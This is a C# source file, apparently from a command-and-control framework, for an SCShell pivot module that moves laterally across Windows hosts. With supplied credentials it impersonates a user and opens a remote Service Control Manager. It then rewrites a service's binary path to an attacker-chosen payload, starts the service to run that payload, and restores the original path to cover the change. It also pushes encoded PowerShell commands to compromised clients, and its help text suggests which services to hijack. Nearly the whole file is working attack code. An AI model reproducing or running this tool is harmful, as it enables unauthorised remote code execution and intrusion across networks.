using System.Runtime.InteropServices;
using System.Text;

namespace C2Framework
{
    public class SCShellPivotManager
    {
        private readonly C2Server _server;
        public readonly ClientHandler _activeClient;

        public SCShellPivotManager(C2Server server, ClientHandler activeClient)
        {
            _server = server;
            _activeClient = activeClient;
        }

        public event EventHandler<OutputMessageEventArgs> OutputMessage;

        private void RaiseOutputMessage(string message, Color color)
        {
            OutputMessage?.Invoke(this, new OutputMessageEventArgs(message, color));
        }

        // Windows API imports
        [DllImport("advapi32.dll", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool LogonUser(
            [MarshalAs(UnmanagedType.LPStr)] string lpszUsername,
            [MarshalAs(UnmanagedType.LPStr)] string lpszDomain,
            [MarshalAs(UnmanagedType.LPStr)] string lpszPassword,
            int dwLogonType,
            int dwLogonProvider,
            ref IntPtr phToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(
            string lpMachineName,
            string lpDatabaseName,
            uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(
            IntPtr hSCManager,
            string lpServiceName,
            uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern int QueryServiceConfig(
            IntPtr service,
            IntPtr queryServiceConfig,
            int bufferSize,
            ref int bytesNeeded);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(
            IntPtr hService,
            uint dwServiceType,
            int dwStartType,
            int dwErrorControl,
            string lpBinaryPathName,
            string lpLoadOrderGroup,
            string lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword,
            string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(
            IntPtr hService,
            int dwNumServiceArgs,
            string[] lpServiceArgVectors);

        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CloseServiceHandle(IntPtr hSCObject);

        public enum SCM_ACCESS : uint
        {
            SC_MANAGER_ALL_ACCESS = 0xF003F,
            SC_MANAGER_CONNECT = 0x00001,
            SC_MANAGER_CREATE_SERVICE = 0x00002,
            SC_MANAGER_ENUMERATE_SERVICE = 0x00004,
        }

        public enum SERVICE_ACCESS : uint
        {
            SERVICE_ALL_ACCESS = 0xF01FF,
            SERVICE_CHANGE_CONFIG = 0x00002,
            SERVICE_QUERY_CONFIG = 0x00001,
            SERVICE_START = 0x00010,
        }

        private struct QueryServiceConfigStruct
        {
            public int serviceType;
            public int startType;
            public int errorControl;
            public IntPtr binaryPathName;
            public IntPtr loadOrderGroup;
            public int tagID;
            public IntPtr dependencies;
            public IntPtr startName;
            public IntPtr displayName;
        }

        // Main pivot command handler
        public async Task HandlePivotCommand(string command)
        {
            if (_activeClient == null)
            {
                RaiseOutputMessage("[!] No active client. Use 'connect <id>' first.", Color.Red);
                return;
            }

            var parts = command.Split(' ');
            if (parts.Length < 2)
            {
                ShowPivotHelp();
                return;
            }

            string subCommand = parts[1].ToLower();

            switch (subCommand)
            {
                case "scshell":
                    await HandleSCShellPivot(parts);
                    break;
                case "test":
                    await TestConnectivity(parts);
                    break;
                case "reset":
                    await ResetService(parts);
                    break;
                case "help":
                    ShowPivotHelp();
                    break;
                default:
                    RaiseOutputMessage($"[!] Unknown pivot method: {subCommand}. Use 'pivot help'", Color.Red);
                    break;
            }
        }

        private void ShowPivotHelp()
        {
            var help = new StringBuilder();
            help.AppendLine("=== SC SHELL PIVOT COMMANDS ===");
            help.AppendLine("pivot scshell <target> <service> <payload> <username> <password> [domain]");
            help.AppendLine("pivot test <target> <username> <password> [domain]");
            help.AppendLine("pivot reset <target> <service> <username> <password> [domain]");
            help.AppendLine("");
            help.AppendLine("Examples:");
            help.AppendLine("pivot test 192.168.1.10 administrator password123");
            help.AppendLine("pivot scshell 192.168.1.10 Spooler \"calc.exe\" administrator password123");
            help.AppendLine("pivot scshell 192.168.1.10 Spooler \"calc.exe\" administrator password123 WORKGROUP");
            help.AppendLine("pivot reset 192.168.1.10 Spooler administrator password123");
            help.AppendLine("");
            help.AppendLine("Recommended Services:");
            help.AppendLine("  Spooler       - Print Spooler (safe to restart)");
            help.AppendLine("  BITS          - Background Transfer Service");
            help.AppendLine("  Fax           - Fax Service");
            help.AppendLine("  VSS           - Volume Shadow Copy");

            RaiseOutputMessage(help.ToString(), Color.Cyan);
        }

        private async Task TestConnectivity(string[] parts)
        {
            if (parts.Length < 5)
            {
                RaiseOutputMessage("Usage: pivot test <target> <username> <password> [domain]", Color.Red);
                return;
            }

            string target = parts[2];
            string username = parts[3];
            string password = parts[4];
            string domain = parts.Length > 5 ? parts[5] : ".";

            string serverIP = GetServerIP();
            int serverPort = GetServerPort();

            RaiseOutputMessage($"[*] Testing connectivity to {target}", Color.Yellow);
            RaiseOutputMessage($"[*] C2 Server: {serverIP}:{serverPort}", Color.Cyan);

            // Use current client to test network connectivity
            string testCmd = $"Test-NetConnection -ComputerName {serverIP} -Port {serverPort}";
            RaiseOutputMessage($"[*] Test command: {testCmd}", Color.Cyan);

            // Execute via current client
            await ExecutePowerShellScript(testCmd);
        }

        private async Task ResetService(string[] parts)
        {
            if (parts.Length < 6)
            {
                RaiseOutputMessage("Usage: pivot reset <target> <service> <username> <password> [domain]", Color.Red);
                return;
            }

            string target = parts[2];
            string serviceName = parts[3];
            string username = parts[4];
            string password = parts[5];
            string domain = parts.Length > 6 ? parts[6] : ".";

            // Known original service paths
            var originalPaths = new Dictionary<string, string>
            {
                { "Spooler", "C:\\Windows\\System32\\spoolsv.exe" },
                { "BITS", "C:\\Windows\\System32\\svchost.exe -k netsvcs -p" },
                { "Fax", "C:\\Windows\\system32\\fxssvc.exe" },
                { "VSS", "C:\\Windows\\system32\\vssvc.exe" },
                { "RemoteRegistry", "C:\\Windows\\system32\\svchost.exe -k LocalService -p" },
                { "Themes", "C:\\Windows\\System32\\svchost.exe -k netsvcs -p" }
            };

            if (!originalPaths.ContainsKey(serviceName))
            {
                RaiseOutputMessage($"[!] Unknown service '{serviceName}'. Cannot determine original path.", Color.Red);
                return;
            }

            string originalPath = originalPaths[serviceName];
            await ResetServiceToOriginal(target, serviceName, username, password, domain, originalPath);
        }

        private async Task HandleSCShellPivot(string[] parts)
        {
            // Parse command with quoted payload support
            var parsedArgs = ParseQuotedCommand(string.Join(" ", parts));

            // pivot scshell <target> <service> <payload> <username> <password> [domain]
            if (parsedArgs.Count < 6)
            {
                RaiseOutputMessage("Usage: pivot scshell <target> <service> \"<payload>\" <username> <password> [domain]", Color.Red);
                RaiseOutputMessage("Example: pivot scshell 192.168.1.10 Spooler \"calc.exe\" administrator password123", Color.Cyan);
                return;
            }

            string target = parsedArgs[2];
            string serviceName = parsedArgs[3];
            string payload = parsedArgs[4];
            string username = parsedArgs[5];
            string password = parsedArgs[6];
            string domain = parsedArgs.Count > 7 ? parsedArgs[7] : ".";

            await ExecuteSCShellPivot(target, serviceName, payload, domain, username, password);
        }

        private async Task ExecuteSCShellPivot(string target, string serviceName, string payload, string domain, string username, string password)
        {
            try
            {
                RaiseOutputMessage($"[*] Starting SCShell pivot to {target} via service '{serviceName}'", Color.Yellow);
                RaiseOutputMessage($"[*] Using payload: {payload}", Color.Cyan);

                // Use the provided payload directly instead of generating one
                string finalPayload = payload;

                // Authentication
                const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
                const int LOGON32_PROVIDER_DEFAULT = 0;
                const uint SERVICE_NO_CHANGE = 0xffffffff;
                const int SERVICE_DEMAND_START = 0x00000003;
                const int SERVICE_ERROR_IGNORE = 0x00000000;

                IntPtr phToken = IntPtr.Zero;
                int bytesNeeded = 5;

                RaiseOutputMessage($"[*] Authenticating as {domain}\\{username}", Color.Cyan);

                bool bResult = LogonUser(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, ref phToken);
                if (!bResult)
                {
                    RaiseOutputMessage($"[!] Authentication failed. Error: {GetLastError()}", Color.Red);
                    return;
                }

                bResult = ImpersonateLoggedOnUser(phToken);
                if (!bResult)
                {
                    RaiseOutputMessage($"[!] Impersonation failed. Error: {GetLastError()}", Color.Red);
                    return;
                }

                RaiseOutputMessage("[+] Authentication successful", Color.Green);

                // Open SCM
                IntPtr SCMHandle = OpenSCManager(target, null, (uint)SCM_ACCESS.SC_MANAGER_ALL_ACCESS);
                if (SCMHandle == IntPtr.Zero)
                {
                    RaiseOutputMessage($"[!] Failed to open SCM. Error: {GetLastError()}", Color.Red);
                    return;
                }

                RaiseOutputMessage("[+] SCM opened successfully", Color.Green);

                // Open service
                IntPtr schService = OpenService(SCMHandle, serviceName, (uint)SERVICE_ACCESS.SERVICE_ALL_ACCESS);
                if (schService == IntPtr.Zero)
                {
                    RaiseOutputMessage($"[!] Failed to open service '{serviceName}'. Error: {GetLastError()}", Color.Red);
                    CloseServiceHandle(SCMHandle);
                    return;
                }

                RaiseOutputMessage($"[+] Service '{serviceName}' opened successfully", Color.Green);

                // Query current service config (for restoration)
                QueryServiceConfigStruct qscs = new QueryServiceConfigStruct();
                IntPtr qscPtr = Marshal.AllocCoTaskMem(0);
                int retCode = QueryServiceConfig(schService, qscPtr, 0, ref bytesNeeded);

                qscPtr = Marshal.AllocCoTaskMem(bytesNeeded);
                retCode = QueryServiceConfig(schService, qscPtr, bytesNeeded, ref bytesNeeded);
                qscs = (QueryServiceConfigStruct)Marshal.PtrToStructure(qscPtr, new QueryServiceConfigStruct().GetType());

                string originalBinaryPath = Marshal.PtrToStringAuto(qscs.binaryPathName);
                RaiseOutputMessage($"[*] Current service path: {originalBinaryPath}", Color.Cyan);
                Marshal.FreeCoTaskMem(qscPtr);

                // Modify service configuration
                RaiseOutputMessage("[*] Modifying service configuration...", Color.Yellow);
                bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, finalPayload, null, null, null, null, null, null);
                if (!bResult)
                {
                    RaiseOutputMessage($"[!] Failed to modify service. Error: {GetLastError()}", Color.Red);
                    CloseServiceHandle(schService);
                    CloseServiceHandle(SCMHandle);
                    return;
                }

                RaiseOutputMessage("[+] Service configuration modified", Color.Green);

                // Start service to execute payload
                RaiseOutputMessage("[*] Starting service to execute payload...", Color.Yellow);
                bResult = StartService(schService, 0, null);
                uint dwResult = GetLastError();

                if (!bResult)
                {
                    if (dwResult == 1053)
                    {
                        RaiseOutputMessage("[*] Service timeout (1053) - payload likely executed", Color.Yellow);
                    }
                    else if (dwResult == 1056)
                    {
                        RaiseOutputMessage("[*] Service already running (1056) - payload likely executed", Color.Yellow);
                    }
                    else
                    {
                        RaiseOutputMessage($"[!] Service start failed. Error: {dwResult}", Color.Red);
                    }
                }
                else
                {
                    RaiseOutputMessage("[+] Service started successfully", Color.Green);
                }

                // Wait for execution
                RaiseOutputMessage("[*] Waiting for payload execution...", Color.Cyan);
                await Task.Delay(5000);

                // Restore original configuration
                RaiseOutputMessage("[*] Restoring service configuration...", Color.Cyan);
                bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, null, null, null, null, null, null);
                if (bResult)
                {
                    RaiseOutputMessage("[+] Service restored successfully", Color.Green);
                }
                else
                {
                    RaiseOutputMessage($"[!] Failed to restore service. Error: {GetLastError()}", Color.Red);
                }

                // Cleanup
                CloseServiceHandle(schService);
                CloseServiceHandle(SCMHandle);

                RaiseOutputMessage("[+] SCShell pivot completed. Monitor for incoming connections.", Color.Green);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] SCShell error: {ex.Message}", Color.Red);
            }
        }



        private async Task ResetServiceToOriginal(string target, string serviceName, string username, string password, string domain, string originalPath)
        {
            try
            {
                RaiseOutputMessage($"[*] Resetting service '{serviceName}' to original state", Color.Yellow);

                // Authentication
                const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
                const int LOGON32_PROVIDER_DEFAULT = 0;
                const uint SERVICE_NO_CHANGE = 0xffffffff;
                const int SERVICE_DEMAND_START = 0x00000003;
                const int SERVICE_ERROR_IGNORE = 0x00000000;

                IntPtr phToken = IntPtr.Zero;

                bool bResult = LogonUser(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, ref phToken);
                if (!bResult)
                {
                    RaiseOutputMessage($"[!] Authentication failed. Error: {GetLastError()}", Color.Red);
                    return;
                }

                ImpersonateLoggedOnUser(phToken);

                // Open SCM and service
                IntPtr SCMHandle = OpenSCManager(target, null, (uint)SCM_ACCESS.SC_MANAGER_ALL_ACCESS);
                if (SCMHandle == IntPtr.Zero)
                {
                    RaiseOutputMessage($"[!] Failed to open SCM. Error: {GetLastError()}", Color.Red);
                    return;
                }

                IntPtr schService = OpenService(SCMHandle, serviceName, (uint)SERVICE_ACCESS.SERVICE_ALL_ACCESS);
                if (schService == IntPtr.Zero)
                {
                    RaiseOutputMessage($"[!] Failed to open service. Error: {GetLastError()}", Color.Red);
                    CloseServiceHandle(SCMHandle);
                    return;
                }

                // Reset to original path
                bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalPath, null, null, null, null, null, null);
                if (bResult)
                {
                    RaiseOutputMessage($"[+] Service '{serviceName}' reset to: {originalPath}", Color.Green);
                }
                else
                {
                    RaiseOutputMessage($"[!] Failed to reset service. Error: {GetLastError()}", Color.Red);
                }

                CloseServiceHandle(schService);
                CloseServiceHandle(SCMHandle);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Reset error: {ex.Message}", Color.Red);
            }
        }

        private async Task ExecutePowerShellScript(string script)
        {
            if (_activeClient.IsLinux)
            {
                RaiseOutputMessage("[!] PowerShell not supported on Linux clients", Color.Red);
                return;
            }

            string encodedScript = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
            string command = $"powershell.exe -EncodedCommand {encodedScript}";

            _activeClient.SendCommand(command);
            await Task.Delay(3000);
        }

        // Parse command line with quoted string support
        private List<string> ParseQuotedCommand(string command)
        {
            var args = new List<string>();
            var current = new StringBuilder();
            bool inQuotes = false;
            bool escapeNext = false;

            for (int i = 0; i < command.Length; i++)
            {
                char c = command[i];

                if (escapeNext)
                {
                    current.Append(c);
                    escapeNext = false;
                }
                else if (c == '\\')
                {
                    escapeNext = true;
                }
                else if (c == '"')
                {
                    inQuotes = !inQuotes;
                }
                else if (c == ' ' && !inQuotes)
                {
                    if (current.Length > 0)
                    {
                        args.Add(current.ToString());
                        current.Clear();
                    }
                }
                else
                {
                    current.Append(c);
                }
            }

            if (current.Length > 0)
            {
                args.Add(current.ToString());
            }

            return args;
        }

        private string GetServerIP()
        {
            try
            {
                var field = _server.GetType().GetField("_ipAddress",
                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
                return field?.GetValue(_server)?.ToString() ?? "127.0.0.1";
            }
            catch
            {
                return "127.0.0.1";
            }
        }

        private int GetServerPort()
        {
            try
            {
                var field = _server.GetType().GetField("_port",
                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
                return field?.GetValue(_server) is int port ? port : 443;
            }
            catch
            {
                return 443;
            }
        }
    }
}